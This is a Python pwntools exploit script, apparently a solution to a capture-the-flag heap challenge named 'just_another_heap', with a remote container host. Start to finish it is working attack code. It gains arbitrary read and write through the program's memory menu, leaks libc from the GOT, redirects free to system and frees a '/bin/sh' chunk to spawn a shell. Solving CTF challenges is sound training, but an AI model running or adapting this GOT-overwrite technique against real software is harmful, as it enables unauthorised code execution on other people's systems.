#!/usr/bin/env python3

from pwn import *

the_binary = "./just_another_heap"
context.binary = the_binary
elf = context.binary
libc = ELF("./libc-2.27.so", checksec=False)

context.terminal = ["tmux", "splitw", "-v"]

if args.REMOTE:
    io = remote("dctf-chall-just-another-heap.westeurope.azurecontainer.io", 7481)
else:
    pty = process.PTY
    io = process(
        ["./ld-2.27.so", the_binary],
        env={"LD_PRELOAD": libc.path},
        stdin=pty, stdout=pty, stderr=pty
    )

if args.GDB:
    gdb.attach(io, f"""
        file {the_binary}
        continue
    """)

def send(data, newline=True):
    if newline:
        io.sendlineafter("> ", data)
    else:
        io.sendafter("> ", data)

def send_num(num):
    send(str(num))
menu = send_num

def create_mem(idx, name, data, sz=None, slack_sz=0, is_important=False, is_recent=False):
    if sz is None:
        sz = len(data)

    menu(1)
    send_num(idx)
    assert len(name) < 0x10
    send(name)
    send_num(sz)
    send_num(slack_sz)
    send(data, newline=False)
    send("Y", newline=False) if is_important else send("N", newline=False)
    send("Y", newline=False) if is_recent else send("N", newline=False)
    io.recvuntil("successfully")

def forget_mem(idx):
    menu(3)
    send_num(idx)

def change_mem(idx, data, start_at_begin=True):
    menu(4)
    send_num(idx)
    send("Y\x00", newline=False) if start_at_begin else send("N\x00", newline=False)
    io.sendafter("write? ", data)

def relive_mem(idx):
    menu(2)
    send_num(idx)

class Const:
    memory_ptrs = 0x602140

    @staticmethod
    def offset_for(idx):
        return idx*8

def arb_write64(where, what):
    if where <= 0xffffffff:
        sz = 0xffffffff00000000 + where + len(what)
    else:
        sz = where + 8
    create_mem(9, "name", what, sz=sz, slack_sz=where)
    forget_mem(9)

# We will corrupt the entry stored on the 8th page to implement arbitrary read.
create_mem(8, "name", "x"*8)
def arb_read(where, is_addr=True):
    write_location = Const.memory_ptrs + Const.offset_for(8)
    arb_write64(write_location, p64(where))
    relive_mem(8)

    leak = io.recvuntil(b"\n\n", drop=True)
    if is_addr:
        leak = u64(leak.ljust(8, b"\x00"))

    return leak

leak = arb_read(elf.got.alarm)
log.info("libc leak: %#x" % leak)
libc.address = leak - libc.sym.alarm
log.info("libc base: %#x" % libc.address)

create_mem(0, "name", "/bin/sh\x00")
arb_write64(elf.got.free, p64(libc.sym.system))
forget_mem(0)

io.interactive()
